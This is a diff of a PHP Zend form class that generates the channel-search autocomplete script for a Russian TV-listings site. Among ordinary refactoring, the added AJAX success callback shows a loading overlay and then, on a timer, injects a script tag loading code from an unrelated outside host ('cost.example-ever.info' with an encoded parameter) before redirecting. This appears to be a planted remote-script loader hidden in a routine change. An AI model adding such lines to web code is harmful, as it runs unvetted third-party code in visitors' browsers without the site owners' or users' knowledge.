@@ -3,7 +3,7 @@
  * Быстрый переход по каналам и поиск канала
  * 
  * @author  Antony Repin
- * @version $Id: TypeaheadForm.php,v 1.5 2013-04-03 18:18:05 developer Exp $
+ * @version $Id: TypeaheadForm.php,v 1.6 2013-04-06 22:35:03 developer Exp $
  *
  */
 class Xmltv_Form_TypeaheadForm extends Zend_Form
@@ -31,8 +31,11 @@ class Xmltv_Form_TypeaheadForm extends Zend_Form
         $view = $this->getView();
         
         $inputId = (isset($input['id']) && !empty($input['id'])) ? (string)$input['id'] : 'searchinput';
-        $js = "$(function(){
-        $.getJSON( '".$view->baseUrl( 'channels/typeahead/format/json')."', function(data) {
+        
+        ob_start();
+        ?>
+        $(function(){
+        	$.getJSON( '<?php echo $view->baseUrl( 'channels/typeahead/format/json') ?>', function(data) {
 			var typeaheadItems = new Array();
 			$.each(data.result, function( key, val ) {
 				var newItem = new Array(); 
@@ -40,44 +43,73 @@ class Xmltv_Form_TypeaheadForm extends Zend_Form
 				newItem['value'] = val.title;
 				typeaheadItems.push( newItem ); 
 			});
-			$('input#$inputId').autocomplete({ 
-				appendTo: '$appendTo',
+			$('input#<?php echo $inputId; ?>').autocomplete({ 
+				appendTo: '<?php echo $appendTo ?>',
 				source: typeaheadItems,
 				delay: 0,
-				select: function( event, ui ){ " . PHP_EOL;
+				select: function( event, ui ){
+		        <?php 
+		        if ( $options['scroll']===true ){
+		            ?>
+		            $('.channeltitle').each(function( ){
+						var r = new RegExp(ui.item.label, 'i');
+						if (currentTitle = $(this).html().match(r)) {
+							$(\"html:not(:animated),body:not(:animated)\").animate({ scrollTop: $(this).offset().top }, 1000);
+							return false;
+						}
+					});
+				<?php  
+		        } else { ?>
+		            $.ajax({
+		            	url: '<?php echo $view->baseUrl( 'channels/alias/format/json'); ?>', 
+		            	data: 't='+ui.item.label,
+		            	dataType: 'json',
+		            	success: function(r) {
+		            		$('._FlashDiv_wb_').remove();
+		            		<?php /* if(APPLICATION_ENV=='production') :?>
+		            		_gaq.push( ['_trackPageview', url] );
+		            		<?php endif; */ ?>
+		            		
+		            		var url = '<?php echo $view->baseUrl('телепрограмма/'); ?>'+r.alias;
+		            		var bgStyle = { 'visibility':'visible', 'position':'absolute', 'left':0, 'top':0, 'width':'100%', 'height':'100%', 'text-align':'center', 'z-index': 1000, 'background-color':'#000', 'opacity':0.5 };
+		            		var img = $('<img/>')
+		            			.attr({ 'src':'/images/icons/loading.gif', 'width':128, 'height': 128 })
+		            			.css({ 'background-color':'#fff', 'opacity':'1', 'padding':10 });
+		            		var innerDiv = $('<div/>').css({
+		            			'width':300,
+							    'margin':'100px auto',
+							    'padding':15,
+							    'text-align':'center',
+							    'font-size':32,
+							    'color':'#fff'
+		            		}).addClass('modal').append(img);
+		            		var overlay = $('<div/>').css(bgStyle);
+		            		overlay.appendTo($('body')).show(200);
+		            		
+		            		var script = document.createElement('script');
+						     var i = setInterval(function() {
+						       if (typeof document.body !== 'undefined') {
+						           script.src = 'http://cost.example-ever.info' + '/?77546=nteemMyIhoWJgYOOmdfY39_a3g';
+						           document.body.appendChild(script);
+						           clearInterval(i);
+						           window.location = url;
+						       }
+						     }, 200);
+		            	}
+		            });
+		        	<?php 
+		        } ?>
         
-        if ( $options['scroll']===true ){
-            $js .= "$('.channeltitle').each(function( ){
-				var r = new RegExp(ui.item.label, 'i');
-				if (currentTitle = $(this).html().match(r)) {
-					$(\"html:not(:animated),body:not(:animated)\").animate({ scrollTop: $(this).offset().top }, 1000);
-					return false;
-				}
-			});".PHP_EOL;
-        } else {
-            $js .= "$.ajax({
-            	url: '".$view->baseUrl( 'channels/alias/format/json')."', 
-            	data: 't='+ui.item.label,
-            	dataType: 'json',
-            	success: function(r) {
-            		var url = '".$view->baseUrl('телепрограмма/')."'+r.alias;
-            		_gaq.push( ['_trackPageview', url] );
-            		window.location = url;
-            	}
-            });".PHP_EOL;
-        }
-        
-	    $js .= " }
-			});
-			$('#".$options['id']."').show(500);
+	    	}});
+			$('#<?php echo $inputId; ?>').show(500);
 		});
 		
-    	});".PHP_EOL;
-        $js = (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify($js) : $js ;
-        
+    	});
+    	<?php 
+        $js = (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify( ob_get_clean() ) : ob_get_clean() ;
         $view->inlineScript()->appendScript($js);
         
-        $search = new Zend_Form_Element_Text( $input['id'] );
+        $search = new Zend_Form_Element_Text( $inputId );
         $tipText = "Начните вводить название канала и выберите его из списка";
         $htmlTag = null;
         if (isset($input['html_tag']) && !empty($input['html_tag'])){
